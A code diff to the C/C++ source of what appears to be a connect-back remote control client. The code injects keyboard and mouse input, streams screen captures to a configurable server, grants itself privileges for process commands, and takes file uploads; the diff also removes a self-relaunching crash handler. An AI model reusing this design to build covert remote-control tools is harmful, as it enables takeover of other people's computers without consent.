@@ -261,7 +261,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		case CMD_KEYDOWN:	//WM_KEYDOWN
 		{
-			//OpenUserDesktop();
 			int nVirtKey = msgHead.dwExtend1;
 			//keybd_event((BYTE)nVirtKey, 0, 0, 0);
 
@@ -275,7 +274,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		case CMD_KEYUP:	//WM_KEYUP
 		{
-			//OpenUserDesktop();
 			int nVirtKey = msgHead.dwExtend1;
 			//keybd_event((BYTE)nVirtKey, 0, KEYEVENTF_KEYUP, 0);
 
@@ -290,8 +288,6 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		case CMD_MOUSEMOVE:	//WM_MOUSEMOVE
 		{
-			//OpenUserDesktop();
-
 			POINT pt;
 			pt.x = msgHead.dwExtend1;
 			pt.y = msgHead.dwExtend2;
@@ -301,21 +297,18 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		case CMD_LBUTTONDOWN:	//WM_LBUTTONDOWN
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
 		}
 		break;
 
 		case CMD_LBUTTONUP:	//WM_LBUTTONUP
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 		}
 		break;
 
 		case CMD_LBUTTONDBLCLK:	//WM_LBUTTONDBLCLK
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
 			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
 			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
@@ -325,21 +318,18 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
 
 		case CMD_RBUTTONDOWN:	//WM_RBUTTONDOWN
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
 		}
 		break;
 
 		case CMD_RBUTTONUP:	//WM_RBUTTONUP
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 		}
 		break;
 
 		case CMD_RBUTTONDBLCLK:	//WM_RBUTTONDBLCLK
 		{
-			//OpenUserDesktop();
 			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
 			mouse_event(MOUSEEVENTF_RIGHTUP, 0, 0, 0, 0);
 			mouse_event(MOUSEEVENTF_RIGHTDOWN, 0, 0, 0, 0);
@@ -469,17 +459,15 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	if (ScreenSocket == SOCKET_ERROR)
 	{
+		MsgErr("Screen Thread connect");
 		return 0;
 	}
 
 	//设置发送缓冲区,有利于屏幕传输
-	int rcvbuf = 65536; //64KB
-	int rcvbufsize = sizeof(int);
-	setsockopt(ScreenSocket, SOL_SOCKET, SO_SNDBUF, (char*)&rcvbuf, rcvbufsize);
-	int bNodelay = 1;
-	setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
-
-	SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
+	int bufSize = 65536; //64KB
+	setsockopt(ScreenSocket, SOL_SOCKET, SO_SNDBUF, (char*)&bufSize, sizeof(bufSize));
+	//int bNodelay = 1;
+	//setsockopt(ScreenSocket, IPPROTO_TCP, TCP_NODELAY, (char*)&bNodelay, sizeof(bNodelay));//不采用延时算法
 
 	MsgHead msgHead;
 
@@ -536,12 +524,10 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 
 	while (bNotStop)
 	{
-		//DWORD dwLastSend = GetTickCount();
-
 		lenthCompress = compressBound(lenthUncompress); //(unsigned long)((lenthUncompress+12)*1.1);
 		m_ScreenXor.CaputreFrameNext(dwFrameID);
 		Sleep(15);
-		::compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
+		compress(pDataCompress, &lenthCompress, m_ScreenXor.GetBmpData(), lenthUncompress);
 
 		msgHead.dwCmd = dwFrameID++;              //当前帧号
 		msgHead.dwSize = lenthCompress;            //传输的数据长度
@@ -551,7 +537,6 @@ DWORD _stdcall ScreenThread(LPVOID lParam)
 		bNotStop = SendMsg(ScreenSocket, (char*)pDataCompress, &msgHead);
 		Dbp("Size: %d", lenthCompress);
 
-		//if ((GetTickCount() - dwLastSend) < 160) Sleep(150);
 		Sleep(125);
 	}
 
@@ -677,6 +662,8 @@ DWORD _stdcall ProcessThread(LPVOID lParam)
 		closesocket(ProcessSocket);
 		return 0;//send socket type error
 	}
+
+	GrantPrivilege();
 
 	while (true)	//接收命令
 	{
@@ -878,17 +865,6 @@ DWORD _stdcall FileUpThread(LPVOID lParam)
 	return 10;
 }
 
-LONG _stdcall Errdo(_EXCEPTION_POINTERS *ExceptionInfo)
-{
-	char SelfPath[128];
-	GetModuleFileNameA(GetModuleHandle(NULL), SelfPath, 128);
-	WinExec(SelfPath, 0);
-	MsgErr("Falt Error");
-
-	//return EXCEPTION_CONTINUE_EXECUTION;
-	return EXCEPTION_EXECUTE_HANDLER;
-}
-
 DWORD WINAPI RoutineMain(LPVOID lp)
 {
 	TCHAR ModulePath[MAX_PATH * 2];
@@ -906,7 +882,7 @@ DWORD WINAPI RoutineMain(LPVOID lp)
 	else
 	{
 		modify_data.ServerPort = 80;
-		lstrcpyA(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
+		strcpy(modify_data.ServerAddr, "127.0.0.1");	//192.168.1.145
 		//lstrcpy(modify_data.ServerAddr, "lkyfire.vicp.net");	//192.168.1.145
 	}
 
@@ -989,8 +965,6 @@ OK:
 
 	WSADATA lpWSAData;
 	WSAStartup(MAKEWORD(2, 2), &lpWSAData);
-
-	//SetUnhandledExceptionFilter(LPTOP_LEVEL_EXCEPTION_FILTER(Errdo));
 
 	RoutineMain(0);
 
